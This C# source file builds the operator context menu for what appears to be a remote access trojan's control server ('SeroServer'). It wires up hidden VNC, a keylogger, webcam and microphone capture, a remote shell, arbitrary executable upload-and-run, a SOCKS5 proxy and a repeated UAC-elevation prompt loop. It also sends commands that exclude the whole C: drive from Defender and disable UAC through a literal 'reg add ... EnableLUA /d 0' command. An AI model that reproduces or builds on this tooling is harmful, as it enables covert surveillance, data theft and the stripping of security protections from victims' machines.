using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using SeroServer.Net;
using SeroServer.Protocol;
using ContextMenu = System.Windows.Controls.ContextMenu;
using MenuItem = System.Windows.Controls.MenuItem;
using Separator = System.Windows.Controls.Separator;

namespace SeroServer.UI;

/// <summary>
/// Builds the same context menu used on the Online tab's GridClients,
/// so it can be reused inside feature windows (RDP, Webcam, HVNC).
/// </summary>
internal static class FeatureContextMenu
{
    /// <summary>
    /// Build a fully populated ContextMenu for a given client.
    /// <paramref name="excludeWindowType"/> is an optional type name
    /// (e.g. "RemoteDesktopWindow") whose menu entry will be omitted.
    /// </summary>
    internal static ContextMenu Build(
        TlsServer server,
        string clientId,
        ServerWindow mainWindow,
        string? excludeWindowType = null)
    {
        var menu = new ContextMenu();

        // ── Administration ──────────────────────────────────────────────
        var admin = MakeParent("Administration", "\uD83D\uDCBC", "#89b4fa");
        admin.Items.Add(MakeItem("Remote Shell", ">_", "#89b4fa", () =>
        {
            var clients = new System.Collections.Generic.List<Data.ConnectedClient>();
            if (server.ConnectedClients.TryGetValue(clientId, out var c)) clients.Add(c);
            mainWindow.OpenFeatureWindow<RemoteShellWindow>(clientId, () => new RemoteShellWindow(server, clients));
        }, fontFamily: "Consolas", fontWeight: FontWeights.Bold, fontSize: 10));
        admin.Items.Add(MakeItem("File Manager",       "\uD83D\uDCC2", "#89b4fa", () => mainWindow.OpenFeatureWindow<FileManagerWindow>(clientId, () => new FileManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Process Manager",    "\u2699",       "#4A85F5", () => mainWindow.OpenFeatureWindow<ProcessManagerWindow>(clientId, () => new ProcessManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Startup Manager",    "\uD83D\uDE80", "#a6e3a1", () => mainWindow.OpenFeatureWindow<StartupManagerWindow>(clientId, () => new StartupManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("TCP Connections",    "\uD83C\uDF10", "#89b4fa", () => mainWindow.OpenFeatureWindow<TcpManagerWindow>(clientId, () => new TcpManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Service Manager",    "\u2699",       "#89b4fa", () => mainWindow.OpenFeatureWindow<ServiceManagerWindow>(clientId, () => new ServiceManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Window Manager",     "\uD83E\uDE9F", "#89b4fa", () => mainWindow.OpenFeatureWindow<WindowManagerWindow>(clientId, () => new WindowManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Registry Editor",    "\uD83D\uDDC4", "#f9e2af", () => mainWindow.OpenFeatureWindow<RegistryEditorWindow>(clientId, () => new RegistryEditorWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Installed Programs", "\uD83D\uDCE6", "#a6e3a1", () => mainWindow.OpenFeatureWindow<InstalledAppsWindow>(clientId, () => new InstalledAppsWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("Device Manager",     "\uD83D\uDD0C", "#89b4fa", () => mainWindow.OpenFeatureWindow<DeviceManagerWindow>(clientId, () => new DeviceManagerWindow(server, clientId, clientId))));
        admin.Items.Add(MakeItem("SOCKS5 Proxy",       "\uD83D\uDD17", "#22C55E", () => mainWindow.OpenFeatureWindow<Socks5Window>(clientId, () => new Socks5Window(server, clientId, clientId))));
        admin.Items.Add(new Separator());
        admin.Items.Add(MakeItem("Remote Execute", "\u26A1", "#f9e2af", () =>
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
                Title = "Select file to execute on client"
            };
            if (dlg.ShowDialog() == true)
            {
                var data = new RemoteFileExecData
                {
                    FileName = System.IO.Path.GetFileName(dlg.FileName),
                    FileBase64 = Convert.ToBase64String(System.IO.File.ReadAllBytes(dlg.FileName))
                };
                _ = server.SendToClient(clientId, new Packet
                {
                    Type = PacketType.RemoteFileExec,
                    Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                });
                ServerWindow.ReportGlobalActivity("Remote execute", clientId, "running");
            }
        }));
        menu.Items.Add(admin);

        // ── Monitoring ──────────────────────────────────────────────────
        var monitoring = MakeParent("Monitoring", "\uD83D\uDD75", "#89dceb");
        if (excludeWindowType != "RemoteDesktopWindow")
            monitoring.Items.Add(MakeItem("Remote Desktop", "\uD83D\uDDA5", "#89b4fa", () => mainWindow.OpenFeatureWindow<RemoteDesktopWindow>(clientId, () => new RemoteDesktopWindow(server, clientId))));
        if (excludeWindowType != "WebcamWindow")
            monitoring.Items.Add(MakeItem("Webcam",         "\uD83D\uDCF7", "#89dceb", () => mainWindow.OpenFeatureWindow<WebcamWindow>(clientId, () => new WebcamWindow(server, clientId))));
        if (excludeWindowType != "HvncWindow")
            monitoring.Items.Add(MakeItem("HVNC",           "\uD83D\uDC8E", "#A855F7", () => mainWindow.OpenFeatureWindow<HvncWindow>(clientId, () => new HvncWindow(server, clientId))));
        monitoring.Items.Add(MakeItem("Microphone",     "\uD83C\uDF99", "#f38ba8", () => mainWindow.OpenFeatureWindow<MicrophoneWindow>(clientId, () => new MicrophoneWindow(server, clientId, clientId))));
        monitoring.Items.Add(MakeItem("Keylogger",      "\u2328",       "#cba6f7", () => mainWindow.OpenFeatureWindow<KeyloggerWindow>(clientId, () => new KeyloggerWindow(server, clientId, clientId))));
        monitoring.Items.Add(new Separator());
        monitoring.Items.Add(MakeItem("Performance Monitor", "\uD83D\uDCCA", "#22C55E", () => mainWindow.OpenFeatureWindow<PerformanceMonitorWindow>(clientId, () => new PerformanceMonitorWindow(server, clientId, clientId))));
        menu.Items.Add(monitoring);

        // ── Miscellaneous ───────────────────────────────────────────────
        var misc = MakeParent("Miscellaneous", "\uD83D\uDD27", "#606880");
        misc.Items.Add(MakeItem("Exclude C:\\ (Defender)", "\uD83D\uDEE1", "#a6e3a1", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.DefenderExclude, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
            ServerWindow.LogGlobal($"[ADMIN] Exclude C:\\ sent to client {clientId}.");
        }));
        misc.Items.Add(MakeItem("Disable UAC", "\u26A0", "#f9e2af", () =>
        {
            _ = server.SendToClient(clientId, new Packet
            {
                Type = PacketType.AutoTaskShell,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { Command = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f" })
            });
            ServerWindow.ReportGlobalActivity("Disable UAC", clientId, "running");
            ServerWindow.LogGlobal($"[ADMIN] Disable UAC request sent to client {clientId}.");
        }));
        menu.Items.Add(misc);

        // ── Fun ─────────────────────────────────────────────────────────
        var fun = MakeParent("Fun", "\uD83C\uDFAE", "#f9e2af");
        fun.Items.Add(MakeItem("Fun Panel",  "\uD83C\uDFAD", "#f9e2af", () => mainWindow.OpenFeatureWindow<FunWindow>(clientId, () => new FunWindow(server, clientId, clientId))));
        fun.Items.Add(new Separator());
        fun.Items.Add(MakeItem("TikTok Bot", "\uD83C\uDFAC", "#f9e2af", () => mainWindow.OpenFeatureWindow<TikTokWindow>(clientId, () => new TikTokWindow(server))));
        menu.Items.Add(fun);

        menu.Items.Add(new Separator());

        // ── Client Management ───────────────────────────────────────────
        var mgmt = MakeParent("Client Management", "\uD83D\uDC64", "#606880");
        mgmt.Items.Add(MakeItem("UAC Elevation", "\uD83D\uDEE1", "#89b4fa", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevation, Data = "{}" });
            ServerWindow.ReportGlobalActivity("UAC elevation", clientId, "running");
            ServerWindow.LogGlobal($"[ADMIN] [UAC] Elevation request sent to client {clientId}.");
        }));
        mgmt.Items.Add(MakeItem("Loop UAC", "\uD83D\uDD01", "#89b4fa", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.RequestElevationLoop, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Loop UAC", clientId, "running");
            ServerWindow.LogGlobal($"[ADMIN] [UAC] Elevation loop started on client {clientId}.");
        }));
        mgmt.Items.Add(new Separator());
        mgmt.Items.Add(MakeItem("Update Client", "\uD83D\uDD04", "#a6e3a1", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.UpdateClient, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Update client", clientId, "running");
            ServerWindow.LogGlobal($"[ADMIN] Update client request sent to client {clientId}.");
        }));
        mgmt.Items.Add(MakeItem("Disconnect", "\u2716", "#f38ba8", () =>
        {
            _ = server.SendToClient(clientId, new Packet { Type = PacketType.Disconnect, Data = "{}" });
            ServerWindow.ReportGlobalActivity("Disconnect", clientId, "complete");
            ServerWindow.LogGlobal($"[ADMIN] Disconnected client {clientId}.");
        }));
        mgmt.Items.Add(MakeItem("Uninstall Client", "\uD83D\uDDD1", "#f38ba8", () =>
        {
            if (MessageBox.Show("Uninstall client? This cannot be undone.", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes)
            {
                _ = server.SendToClient(clientId, new Packet { Type = PacketType.Uninstall, Data = "{}" });
                ServerWindow.ReportGlobalActivity("Uninstall", clientId, "complete");
                ServerWindow.LogGlobal($"[ADMIN] Uninstall command sent to client {clientId}.");
            }
        }));
        mgmt.Items.Add(new Separator());
        mgmt.Items.Add(MakeItem("Set Tag", "\uD83C\uDFF7", "#89b4fa", () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c))
            {
                var dlg = new TagDialog(c.Tag);
                if (dlg.ShowDialog() == true)
                {
                    c.Tag = dlg.TagValue;
                    mainWindow.Store.SetTag(c.Hwid, dlg.TagValue);
                }
            }
        }));
        mgmt.Items.Add(MakeItem("View Logs", "\uD83D\uDCDC", "#cba6f7", () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c)
                && mainWindow.Store.AllClients.TryGetValue(c.Hwid, out var record))
            {
                mainWindow.OpenFeatureWindow<ClientLogWindow>(clientId, () => new ClientLogWindow(record));
            }
        }));
        mgmt.Items.Add(MakeItem("Copy IP", "\uD83D\uDCCB", "#89b4fa", () =>
        {
            if (server.ConnectedClients.TryGetValue(clientId, out var c))
                Clipboard.SetText(c.IP);
        }));
        menu.Items.Add(mgmt);

        return menu;
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private static MenuItem MakeParent(string header, string icon, string color)
    {
        var mi = new MenuItem { Header = header };
        mi.Icon = MakeIcon(icon, color);
        return mi;
    }

    private static MenuItem MakeItem(string header, string icon, string color, Action onClick,
        string? fontFamily = null, FontWeight? fontWeight = null, double fontSize = 11)
    {
        var mi = new MenuItem { Header = header };
        mi.Icon = MakeIcon(icon, color, fontFamily, fontWeight, fontSize);
        mi.Click += (_, _) =>
        {
            try { onClick(); }
            catch (Exception ex) { System.Diagnostics.Debug.WriteLine($"[FeatureMenu] {header}: {ex.Message}"); }
        };
        return mi;
    }

    private static TextBlock MakeIcon(string text, string color,
        string? fontFamily = null, FontWeight? fontWeight = null, double fontSize = 11)
    {
        var brush = (SolidColorBrush)new BrushConverter().ConvertFromString(color)!;
        return new TextBlock
        {
            Text = text,
            FontSize = fontSize,
            Foreground = brush,
            FontFamily = fontFamily != null ? new System.Windows.Media.FontFamily(fontFamily) : new System.Windows.Media.FontFamily("Segoe UI Emoji"),
            FontWeight = fontWeight ?? FontWeights.Normal
        };
    }
}
